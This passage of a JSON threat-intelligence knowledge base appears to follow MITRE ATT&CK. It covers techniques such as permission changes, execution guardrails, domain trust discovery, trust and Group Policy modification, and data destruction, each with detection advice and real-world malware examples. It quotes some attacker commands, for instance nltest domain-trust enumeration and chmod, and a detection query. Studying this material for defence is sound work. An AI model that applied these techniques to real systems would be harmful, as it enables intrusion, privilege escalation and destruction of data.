    "Description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.[1][2]File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).Most Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform’s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs:chown(short for change owner), andchmod(short for change mode).Adversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence viaUnix Shell Configuration Modificationor tainting/hijacking other instrumental binary/configuration files viaHijack Execution Flow.[3]",
    "Detects": [
      "Many of the commands used to modify ACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible. Commonly abused command arguments includechmod +x,chmod -R 755, andchmod 777.[3]",
      "Monitor and investigate attempts to modify ACLs and file/directory ownership. Consider enabling file/directory permission change auditing on folders containing key binary/configuration files.This looks for any invocations of chmod. Note that this is likely to be more noisy than the Windows-specific implementation, although Linux does not generate logs for system triggered activities like in Windows. In addition, it may be necessary to whitelist cron jobs that regularly run and execute chmod.Linux environment logs can be more noisy than the Windows-specific implementation, although Linux does not generate logs for system triggered activities like in Windows. In addition, it may be necessary to whitelist cron jobs that regularly run and execute chmod.Analytic 1 - Access Permission Modification for Linuxsourcetype=linux_logs CommandLine=\"chmod*\"",
      "Monitor for newly executed processes that may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.[1][2]"
    ],
    "Procedure Examples": [
      "APT32's macOS backdoor changes the permission of the file it wants to execute to 755.[4]",
      "TheBlack Bastabinary can usechmodto gain full permissions to targeted files.[5]",
      "Bundlorechanges the permissions of a payload using the commandchmod -R 755.[3]",
      "COATHANGERwill set the GID ofhttpsdto 90 when infected.[6]",
      "Dokgives all users execute permissions for the application using the commandchmod +x /Users/Shared/AppStore.app.[7]",
      "Kinsinghas used chmod to modify permissions on key files for use.[8]",
      "KV Botnet Activityaltered permissions on downloaded tools and payloads to enable execution on victim machines.[9]",
      "OSX/Shlayercan use thechmodutility to set a file as executable, such aschmod 777orchmod +x.[3][10][11]",
      "OSX_OCEANLOTUS.Dhas changed permissions of a second-stage payload to an executable viachmod.[12]",
      "P.A.S. Webshellhas the ability to modify file permissions.[13]",
      "Penquincan add the executable flag to a downloaded file.[14]",
      "Rockehas changed file permissions of files so they could not be modified.[15]",
      "TeamTNThas modified the permissions on binaries withchattr.[16][17]",
      "XCSSETuses thechmod +xcommand to grant executable permissions to the malicious file.[3]"
    ]
  },
  "T1480": {
    "Name": "Execution Guardrails",
    "Description": "Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.[1]Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.[2]Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typicalVirtualization/Sandbox Evasion. While use ofVirtualization/Sandbox Evasionmay involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.Adversaries may identify and block certain user-agents to evade defenses and narrow the scope of their attack to victims and platforms on which it will be most effective. A user-agent self-identifies data such as a user's software application, operating system, vendor, and version. Adversaries may check user-agents for operating system identification and then only serve malware for the exploitable software while ignoring all other operating systems.[3]",
    "Detects": [
      "Monitor executed commands and arguments that may gather information about the victim's business relationships that can be used during targeting. Detecting the use of guardrails may be difficult depending on the implementation.",
      "Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms ofDiscovery, especially in a short period of time, may aid in detection. Detecting the use of guardrails may be difficult depending on the implementation."
    ],
    "Procedure Examples": [
      "Akira _v2will fail to execute if the targeted/vmfs/volumes/path does not exist or is not defined.[4]",
      "Anchorcan terminate itself if specific execution flags are not present.[5]",
      "Apostle's ransomware variant requires that a base64-encoded argument is passed when executed, that is used as the Public Key for subsequent encryption operations. IfApostleis executed without this argument, it automatically runs a self-delete function.[6]",
      "BitPaymercompares file names and paths to a list of excluded names and directory names during encryption.[7]",
      "BlackBytestopped execution if identified language settings on victim machines was Russian or one of several language associated with former Soviet republics.[8]BlackBytehas used ransomware variants requiring a key passed on the command line for the malware to execute.[9]",
      "BlackByte Ransomwarecreates a mutex value with a hard-coded name, and terminates if that mutex already exists on the victim system.BlackByte Ransomwarechecks the system language to see if it matches one of a list of hard-coded values; if a match is found, the malware will terminate.[10]",
      "BOLDMOVEverifies it is executing from a specific path during execution.[11]",
      "BoomBoxcan check its current working directory and for the presence of a specific file and terminate if specific values are not found.[12]",
      "BPFDoorcreates a zero byte PID file at/var/run/haldrund.pid.BPFDooruses this file to determine if it is already running on a system to ensure only one instance is executing at a time.[13]",
      "CHIMNEYSWEEPcan execute a task which leads to execution if it finds a process name containing \"creensaver.\"[14]",
      "DarkGateuses per-victim links for hosting malicious archives, such as ZIP files, in services such as SharePoint to prevent other entities from retrieving them.[15]",
      "DEADEYEcan ensure it executes only on intended systems by identifying the victim's volume serial number, hostname, and/or DNS domain.[16]",
      "EnvyScoutcan callwindow.location.pathnameto ensure that embedded files are being executed from the C: drive, and will terminate if they are not.[12]",
      "Exbytechecks for the presence of a configuration file before completing execution.[17]",
      "Gamaredon Grouphas used geoblocking to limit downloads of the malicious file to specific geographic locations.[18]",
      "On macOS,LightSpychecks the existence of a process identification number (PID) file,/Users/Shared/irc.pid, to verify ifLightSpyis currently running.[19]",
      "LockBit 2.0will not execute on hosts where the system language is set to a language spoken in the Commonwealth of Independent States region.[20][21]",
      "LockBit 3.0can make execution dependent on specific parameters including a unique passphrase and the system language of the targeted host not being found on a set exclusion list.[22][23][24]",
      "LunarLoadercan use the DNS domain name of a compromised host to create a decryption key to ensure a malicious payload can only execute against the intended targets.[25]",
      "NativeZonecan check for the presence of KM.EkeyAlmaz1C.dll and will halt execution unless it is in the same directory as the rest of the malware's components.[12][26]",
      "RansomHubwill terminate without proceeding to encryption if the infected machine is on a list of allowlisted machines specified in its configuration.[27]",
      "Raspberry Robinwill check for the presence of several security products on victim machines and will avoid UAC bypass mechanisms if they are identified.[28]Raspberry Robincan use specific cookie values in HTTP requests to command and control infrastructure to validate that requests for second stage payloads originate from the initial downloader script.[29]",
      "Mustang Pandaincluded the use of Cloudflare geofencing mechanisms to limit payload download activity duringRedDelta Modified PlugX Infection Chain Operations.[30]",
      "ROADSWEEPrequires four command line arguments to execute correctly, otherwise it will produce a message box and halt execution.[14][31][32]",
      "Sagerunexuses a \"servicemain\" function to verify its environment to ensure it can only be executed as a service, as well as the existence of a configuration file in a specified directory.[33]",
      "ShrinkLockerwill exit its \"main\" function if the victim domain name does not match provided criteria.[34]",
      "Small Sievecan only execute correctly if the wordPlatypusis passed to it on the command line.[35]",
      "StealBitwill execute an empty infinite loop if it detects it is being run in the context of a debugger.[36]",
      "StrelaStealervariants only execute if the keyboard layout or language matches a set list of variables.[37][38]",
      "Stuxnetchecks for specific operating systems on 32-bit machines, Registry keys, and dates for vulnerabilities, and will exit execution if the values are not met.[39]",
      "SUNSPOTonly replaces SolarWinds Orion source code if the MD5 checksums of both the original source code file and backdoored replacement source code match hardcoded values.[40]",
      "Torismais only delivered to a compromised host if the victim's IP address is on an allow-list.[41]",
      "VaporRagehas the ability to check for the presence of a specific DLL and terminate if it is not found.[12]"
    ]
  },
  "T1480.001": {
    "Name": "Execution Guardrails:Environmental Keying",
    "Description": "Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation ofExecution Guardrailsthat utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.[1]Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.[2][3][4][5][6]By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.[2][6]These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).Similar toObfuscated Files or Information, adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.[2][4][5][6][7]By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.[2]This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.Like otherExecution Guardrails, environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typicalVirtualization/Sandbox Evasion. While use ofVirtualization/Sandbox Evasionmay involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.",
    "Detects": [
      "Monitor executed commands and arguments that may gather the victim's physical location(s) that can be used during targeting. Detecting the use of environmental keying may be difficult depending on the implementation.",
      "Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms ofDiscovery, especially in a short period of time, may aid in detection. Detecting the use of environmental keying may be difficult depending on the implementation."
    ],
    "Procedure Examples": [
      "APT41has encrypted payloads using the Data Protection API (DPAPI), which relies on keys tied to specific user accounts on specific machines.APT41has also environmentally keyed second stage malware with an RC5 key derived in part from the infected system's volume serial number.[8]",
      "Equationhas been observed utilizing environmental keying in payload delivery.[2][9]",
      "InvisiMolecan use Data Protection API to encrypt its components on the victim’s computer, to evade detection, and to make sure the payload can only be decrypted and loaded on one specific compromised computer.[10]",
      "Ninjacan store its final payload in the Registry under$HKLM\\SOFTWARE\\Classes\\Interface\\encrypted with a dynamically generated key based on the drive’s serial number.[11]",
      "Pikabotstops execution if the infected system language matches one of several languages, with various versions referencing: Georgian, Kazakh, Uzbek, Tajik, Russian, Ukrainian, Belarussian, and Slovenian.[12][13]",
      "PowerPunchcan use the volume serial number from a target host to generate a unique XOR key for the next stage payload.[14]",
      "ROKRATrelies on a specific victim hostname to execute and decrypt important strings.[15]",
      "TheWinnti for Windowsdropper component can verify the existence of a single command line parameter and either terminate if it is not found or later use it as a decryption key.[16]"
    ]
  },
  "T1480.002": {
    "Name": "Execution Guardrails:Mutual Exclusion",
    "Description": "Adversaries may constrain execution or actions based on the presence of a mutex associated with malware. A mutex is a locking mechanism used to synchronize access to a resource. Only one thread or process can acquire a mutex at a given time.[1]While local mutexes only exist within a given process, allowing multiple threads to synchronize access to a resource, system mutexes can be used to synchronize the activities of multiple processes.[1]By creating a unique system mutex associated with a particular malware, adversaries can verify whether or not a system has already been compromised.[2]In Linux environments, malware may instead attempt to acquire a lock on a mutex file. If the malware is able to acquire the lock, it continues to execute; if it fails, it exits to avoid creating a second instance of itself.[3][4]Mutex names may be hard-coded or dynamically generated using a predictable algorithm.[5]",
    "Detects": [
      "Monitor for the suspicious creation of lock files – for example, in shared memory directories such as/var/run.[16]",
      "Monitor for suspicious API calls associated with system mutex creation, such asCreateMutex/CreateMutexAon Windows systems.[17]For example, it is rare for legitimate programs to create random mutex names.[2]Additionally, monitor for suspicious syscalls associated with lock files, such asflockon Linux."
    ],
    "Procedure Examples": [
      "APT38has created a mutex to avoid duplicate execution.[6]",
      "Black Bastawill check for the presence of a hard-coded mutexdsajdhas.0before executing.[7]",
      "When executed,BPFDoorattempts to create and lock a runtime file,/var/run/initd.lock, and exits if it fails using the specified file, resulting in a makeshift mutex.[4]",
      "Gazercreates a mutex using the hard-coded value{531511FA-190D-5D85-8A4A-279F2F592CC7}to ensure that only one instance of itself is running.[8]",
      "GrimAgentuses the last 64 bytes of the binary to compute a mutex name. If the generated name is invalid, it will default to the genericmymutex.[9]",
      "LockBit 3.0can create and check for a mutex containing a hash of theMachineGUIDvalue at execution to prevent running more than one instance.[10]",
      "PoisonIvycreates a mutex using either a custom or default value.[11]",
      "REvilattempts to create a mutex using a hard-coded value to ensure that no other instances of itself are running on the host.[12]",
      "StrelaStealervariants include the use of mutex values based on the victim system name to prevent reinfection.[13]",
      "SUNSPOTcreates a mutex using the hard-coded value{12d61a41-4b74-7610-a4d8-3028d2f56395}to ensure that only one instance of itself is running.[14]",
      "Troll Stealercreates a mutex during installation to prevent duplicate execution.[15]"
    ]
  },
  "T1482": {
    "Name": "Domain Trust Discovery",
    "Description": "Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.[1]Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conductSID-History Injection,Pass the Ticket, andKerberoasting.[2][3]Domain trusts can be enumerated using theDSEnumerateDomainTrusts()Win32 API call, .NET methods, and LDAP.[3]The Windows utilityNltestis known to be used by adversaries to enumerate domain trusts.[4]",
    "Detects": [
      "Monitor executed commands and arguments for actions that could be taken to gather system and network information, such as nltest /domain_trusts. Remote access tools with built-in features may interact directly with the Windows API to gather information.",
      "Monitor and analyze traffic patterns and packet inspection associated to LDAP and MSRPC that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure).",
      "Monitor for API calls associated with gathering information on domain trust relationships that may be used to identify lateral movement like DSEnumerateDomainTrusts() Win32 API call to spot activity associated with Domain Trust Discovery.[3]Information may also be acquired through Windows system management tools such as PowerShell. The .NET method GetAllTrustRelationships() can be an indicator of Domain Trust Discovery.[48]",
      "Monitor for newly executed processes that may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments.",
      "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
    ],
    "Procedure Examples": [
      "AdFindcan gather information about organizational units (OUs) and domain trusts from Active Directory.[5][6][7][8]",
      "Akirauses the built-inNltestutility or tools such asAdFindto enumerate Active Directory trusts in victim environments.[9]",
      "BADHATCHcan usenltest.exe /domain_truststo discover domain trust relationships on a compromised machine.[10]",
      "Bazarcan useNltesttools to obtain information about the domain.[11][12]",
      "BlackByteenumerated Active Directory information and trust relationships during operations.[13][14]",
      "BloodHoundhas the ability to map domain trusts and identify misconfigurations for potential abuse.[15]",
      "Brute Ratel C4can use LDAP queries andnltest /domain_trustsfor domain trust discovery.[16][17]",
      "DuringC0015, the threat actors used the commandnltest /domain_trusts /all_truststo enumerate domain trusts.[18]",
      "Chimerahasnltest /domain_truststo identify domain trust relationships.[19]",
      "dsquerycan be used to gather information on domain trusts withdsquery * -filter \"(objectClass=trustedDomain)\" -attr *.[3]",
      "DUSTTRAPcan identify Active Directory information and related items.[20]",
      "Earth Luscahas usedNltestto obtain information about domain controllers.[21]",
      "Empirehas modules for enumerating domain trusts.[22]",
      "FIN8has retrieved a list of trusted domains by usingnltest.exe /domain_trusts.[23]",
      "IcedIDusedNltestduring initial discovery.[24][25]",
      "Latrodectuscan runC:\\Windows\\System32\\cmd.exe /c nltest /domain_truststo discover domain trusts.[26][27]",
      "Leviathanperformed Active Directory enumeration of victim environments duringLeviathan Australian Intrusions.[28]",
      "Lotus Blossomhas used tools such asAdFindto make Active Directory queries.[29]",
      "Magic Houndhas used a web shell to executenltest /trusted_domainsto identify trust relationships.[30]",
      "MgBotincludes modules for collecting information on local domain users and permissions.[31]",
      "Nltestmay be used to enumerate trusted domains by using commands such asnltest /domain_trusts.[32][33]",
      "Pikabotwill gather information concerning the Windows Domain the victim machine is a member of during execution.[34]",
      "PoshC2has modules for enumerating domain trusts.[35]",
      "PowerSploithas modules such asGet-NetDomainTrustandGet-NetForestTrustto enumerate domain and forest trusts.[36][37]",
      "QakBotcan runnltest /domain_trusts /all_trustsfor domain trust discovery.[38]",
      "Rubeuscan gather information about domain trusts.[39][40]",
      "SocGholishcan profile compromised systems to identify domain trust relationships.[41][42]",
      "During theSolarWinds Compromise,APT29used theGet-AcceptedDomainPowerShell cmdlet to enumerate accepted domains through an Exchange Management Shell.[43]They also usedAdFindto enumerate domains and to discover trust between federated domains.[44][45]",
      "Storm-1811has enumerated domain accounts and access during intrusions.[46]",
      "TrickBotcan gather information about domain trusts by utilizingNltest.[33][47]"
    ]
  },
  "T1484": {
    "Name": "Domain or Tenant Policy Modification",
    "Description": "Adversaries may modify the configuration settings of a domain or identity tenant to evade defenses and/or escalate privileges in centrally managed environments. Such services provide a centralized means of managing identity resources such as devices and accounts, and often include configuration settings that may apply between domains or tenants such as trust relationships, identity syncing, or identity federation.Modifications to domain or tenant settings may include altering domain Group Policy Objects (GPOs) in Microsoft Active Directory (AD) or changing trust settings for domains, including federation trusts relationships between domains or tenants.With sufficient permissions, adversaries can modify domain or tenant policy settings. Since configuration settings for these services apply to a large number of identity resources, there are a great number of potential attacks malicious outcomes that can stem from this abuse. Examples of such abuse include:modifying GPOs to push a maliciousScheduled Taskto computers throughout the domain environment[1][2][3]modifying domain trusts to include an adversary-controlled domain, allowing adversaries to  forge access tokens that will subsequently be accepted by victim domain resources[4]changing configuration settings within the AD environment to implement aRogue Domain Controller.adding new, adversary-controlled federated identity providers to identity tenants, allowing adversaries to authenticate as any user managed by the victim tenant[5]Adversaries may temporarily modify domain or tenant policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.",
    "Detects": [
      "Monitor for newly constructed active directory objects, such as Windows EID 5137.",
      "Monitor for unexpected deletion of an active directory object, such as Windows EID 5141.",
      "Monitor for changes made to AD settings for unexpected modifications to user accounts, such as deletions or potentially malicious changes to user attributes (credentials, status, etc.).",
      "Monitor changes to cloud-based directory services and identity tenants, especially regarding the addition of new federated identity providers. In Okta environments, the eventsystem.idp.lifecycle.createwill trigger on the creation of an identity provider, while sign-ins from a third-party identity provider will create the eventuser.authentication.auth_via_IDP.[9]",
      "Monitor executed commands and arguments for modifications to domain trust settings, such as when a user or application modifies the federation settings on the domain or updates domain authentication from Managed to Federated via ActionTypesSet federation settings on domainandSet domain authentication.[10][11]"
    ],
    "Procedure Examples": [
      "Identify and correct GPO permissions abuse opportunities (ex: GPO modification privileges) using auditing tools such asBloodHound(version 1.5.1 and later)[6].",
      "Use least privilege and protect administrative access to the Domain Controller and Active Directory Federation Services (AD FS) server. Do not create service accounts with administrative privileges.",
      "Consider implementing WMI and security filtering to further tailor which users and computers a GPO will apply to.[2][7][8]"
    ]
  },
  "T1484.001": {
    "Name": "Domain or Tenant Policy Modification:Group Policy Modification",
    "Description": "Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\.[1][2]Like other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.Malicious GPO modifications can be used to implement many other malicious behaviors such asScheduled Task/Job,Disable or Modify Tools,Ingress Tool Transfer,Create Account,Service Execution,  and more.[2][3][4][5][6]Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.[3]For example, publicly available scripts such asNew-GPOImmediateTaskcan be leveraged to automate the creation of a maliciousScheduled Task/Jobby modifying GPO settings, in this case modifying<GPO_PATH>\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml.[3][4]In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in<GPO_PATH>\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.[7]",
    "Detects": [
      "Monitor for newly constructed active directory objects, such as Windows EID 5137.",
      "Monitor for unexpected deletion of an active directory object, such as Windows EID 5141.",
      "Monitor for changes made to AD settings for unexpected modifications to user accounts, such as deletions or potentially malicious changes to user attributes (credentials, status, etc.).",
      "Monitor executed commands and arguments that may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain."
    ],
    "Procedure Examples": [
      "During the2022 Ukraine Electric Power Attack,Sandworm Teamleveraged Group Policy Objects (GPOs) to deploy and execute malware.[8]",
      "APT41used scheduled tasks created via Group Policy Objects (GPOs) to deploy ransomware.[9]",
      "Cinnamon Tempesthas used Group Policy to deploy batch scripts for ransomware deployment.[10]",
      "Egregorcan modify the GPO to evade detection.[11][12]",
      "Empirecan useNew-GPOImmediateTaskto modify a GPO that will install and execute a maliciousScheduled Task/Job.[13]",
      "HermeticWiperhas the ability to deploy through an infected system's default domain policy.[14]",
      "Indrik Spiderhas used Group Policy Objects to deploy batch scripts.[15][16]",
      "LockBit 2.0can modify Group Policy to disable Windows Defender and to automatically infect devices in Windows domains.[17][18]",
      "LockBit 3.0can enable options for propogation through Group Policy Objects.[19]",
      "Meteorcan use group policy to push a scheduled task from the AD to all network machines.[20]",
      "Prestigehas been deployed using the Default Domain Group Policy Object from an Active Directory Domain Controller.[21]"
    ]
  },
  "T1484.002": {
    "Name": "Domain or Tenant Policy Modification:Trust Modification",
    "Description": "Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources.[1]These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.Manipulating these trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, in Microsoft Active Directory (AD) environments, this may be used to forgeSAML Tokenswithout the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert an AD domain to a federated domain using Active Directory Federation Services (AD FS), which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.[2]An adversary may also add a new federated identity provider to an identity tenant such as Okta or AWS IAM Identity Center, which may enable the adversary to authenticate as any user of the tenant.[3]This may enable the threat actor to gain broad access into a variety of cloud-based services that leverage the identity tenant. For example, in AWS environments, an adversary that creates a new identity provider for an AWS Organization will be able to federate into all of the AWS Organization member accounts without creating identities for each of the member accounts.[4]",
    "Detects": [
      "Monitor for newly constructed active directory objects, such as Windows EID 5137.",
      "Monitor for changes made to AD settings for unexpected modifications to domain trust settings, such as when a user or application modifies the federation settings on the domain.",
      "Monitor changes to cloud-based directory services and identity tenants, especially regarding the addition of new federated identity providers. In Okta environments, the eventsystem.idp.lifecycle.createwill trigger on the creation of an identity provider, while sign-ins from a third-party identity provider will create the eventuser.authentication.auth_via_IDP.[10]In AWS environments, alert on events such asStartSSO,CreateSAMLProvider, orCreateOIDCProvider.[4]",
      "Monitor executed commands and arguments that updates domain authentication from Managed to Federated via ActionTypesSet federation settings on domainandSet domain authentication.[11]Monitor for PowerShell commands such as:Update-MSOLFederatedDomain –DomainName: \"Federated Domain Name\", orUpdate-MSOLFederatedDomain –DomainName: \"Federated Domain Name\" –supportmultipledomain.[12]"
    ],
    "Procedure Examples": [
      "AADInternalscan create a backdoor by converting a domain to a federated domain which will be able to authenticate any user across the tenant.AADInternalscan also modify DesktopSSO information.[5][6]",
      "Scattered Spideradds a federated identity provider to the victim’s SSO tenant and activates automatic account linking.[7]",
      "During theSolarWinds Compromise,APT29changed domain federation trust settings using Azure AD administrative permissions to configure the domain to accept authorization tokens signed by their own SAML signing certificate.[8][9]"
    ]
  },
  "T1485": {
    "Name": "Data Destruction",
    "Description": "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.[1][2][3][4][5][6]Common operating system file deletion commands such asdelandrmoften only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct fromDisk Content WipeandDisk Structure Wipebecause individual files are destroyed rather than sections of a storage disk or the disk's logical structure.Adversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.[4][5]In some cases politically oriented image files have been used to overwrite data.[2][3][4]To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques likeValid Accounts,OS Credential Dumping, andSMB/Windows Admin Shares.[1][2][3][4][6].In cloud environments, adversaries may leverage access to delete cloud storage objects, machine images, database instances, and other infrastructure crucial to operations to damage an organization or their customers.[7][8]Similarly, they may delete virtual machines from on-prem virtualized environments.",
    "Detects": [
      "Monitor for unexpected deletion of a cloud storage infrastructure, such as theDeleteDBClusterandDeleteGlobalClusterevents in AWS, or a high quantity of data deletion events, such asDeleteBucket. Many of these events within a short period of time may indicate malicious activity.",
      "Monitor for unexpected use of lifecycle policies. Where lifecycle policies are already in use, monitor for changes to cloud storage configurations and policies, such as buckets configured in the policy or unusually short retention periods. In AWS environments, monitor forPutBucketLifecycleevents with arequestParameters.LifecycleConfiguration.Rule.Expiration.Daysattribute below expected values.[51]",
      "Monitor executed commands and arguments for binaries that could be involved in data destruction activity, such as SDelete.",
      "Monitor for unexpected deletion to a file (ex: Sysmon EID 23)",
      "Monitor for changes made to a large quantity of files for unexpected modifications in user directories and under C:\\Windows\\System32.",
      "Monitor for unexpected deletion of a virtual machine image (ex: Azure Compute Service ImagesDELETE)",
      "Monitor for unexpected deletion of a virtual machine or database instance (ex:instance.deletewithin GCP Audit Logs,DeleteDBInstancein AWS)",
      "Monitor for newly executed processes of binaries that could be involved in data destruction activity, such as SDelete.",
      "Monitor for unexpected deletion of a snapshot (ex: AWSDeleteSnapshot,DeleteDBSnapshot)",
      "Monitor for unexpected deletion of a cloud volume (ex: AWSDeleteVolume)"
    ],
    "Procedure Examples": [
      "During the2022 Ukraine Electric Power Attack,Sandworm TeamdeployedCaddyWiperon the victim’s IT environment systems to wipe files related to the OT capabilities, along with mapped drives, and physical drive partitions.[9]",
      "AcidPourcan perform an in-depth wipe of victim filesystems and attached storage devices through either data overwrite or calling various IOCTLS to erase them, similar toAcidRain.[10]",
      "AcidRainperforms an in-depth wipe of the target filesystem and various attached storage devices through either a data overwrite or calling various IOCTLS to erase it.[11]",
      "Apostleinitially masqueraded as ransomware but actual functionality is a data destruction tool, supported by an internal name linked to an early version,wiper-action.Apostlewrites random data to original files after an encrypted copy is created, along with resizing the original file to zero and changing time property metadata before finally deleting the original file.[12]",
      "APT38has used a custom secure delete function to make deleted files unrecoverable.[13]",
      "BlackEnergy2 contains a \"Destroy\" plug-in that destroys data stored on victim hard drives by overwriting file contents.[14][15]",
      "CaddyWipercan work alphabetically through drives on a compromised system to take ownership of and overwrite all files.[16][17]",
      "DEADWOODoverwrites files on victim systems with random data to effectively destroy them.[12]",
      "Diavolcan delete specified files from a targeted system.[18]",
      "HermeticWipercan recursively wipe folders and files inWindows,Program Files,Program Files(x86),PerfLogs,Boot, System,Volume Information, andAppDatafolders usingFSCTL_MOVE_FILE.HermeticWipercan also overwrite symbolic links and big files inMy Documentsand on the Desktop with random bytes.[19]",
      "Industroyer’s data wiper module clears registry keys and overwrites both ICS configuration and Windows files.[20]",
      "Kazuarcan overwrite files with random data before deleting them.[21]",
      "KillDiskdeletes system files to make the OS unbootable.KillDiskalso targets and deletes files with 35 different file extensions.[22]",
      "LAPSUS$has deleted the target's systems and resources both on-premises and in the cloud.[23][24]",
      "Lazarus Grouphas used a custom secure delete function to overwrite file contents with data from heap memory.[25]",
      "Meteorcan fill a victim's files and directories with zero-bytes in replacement of real content before deleting them.[26]",
      "MultiLayer Wiperdeletes files on network drives, but corrupts and overwrites with random data files stored locally.[27]",
      "Olympic Destroyeroverwrites files locally and on remote shares.[6][28]",
      "PowerDukehas a command to write random data across a file and delete it.[29]",
      "Proxysvccan overwrite files indicated by the attacker before deleting them.[30]",
      "RawDiskwas used inShamoonto write to protected system locations such as the MBR and disk partitions in an effort to destroy data.[3][5]",
      "REvilhas the capability to destroy files and folders.[31][32][33][33][34][35][36]",
      "Sandworm Teamhas usedCaddyWiper,SDelete, and theBlackEnergyKillDisk component to overwrite files on victim systems.[37][38][9]Additionally,Sandworm Teamhas used the JUNKMAIL tool to overwrite files with null bytes.[39]",
      "SDeletedeletes data in a way that makes it unrecoverable.[40]",
      "Shamoonattempts to overwrite operating system files and disk structures with image files.[1][2][3]In a later variant, randomly generated data was used for data overwrites.[5][41]",
      "ShrinkLockercan initiate a destructive payload depending on the operating system check through resizing and reformatting portions of the victim machine's disk, leading to system instability and potential data corruption.[42]",
      "StoneDrillhas a disk wiper module that targets files other than those in the Windows directory.[4]",
      "WhisperGatecan corrupt files by overwriting the first 1 MB with0xccand appending random extensions.[43][44][45][46][47][48]",
      "Xbashhas destroyed Linux-based databases as part of its ransomware capabilities.[49]"
    ]
  },
  "T1485.001": {
    "Name": "Data Destruction:Lifecycle-Triggered Deletion",
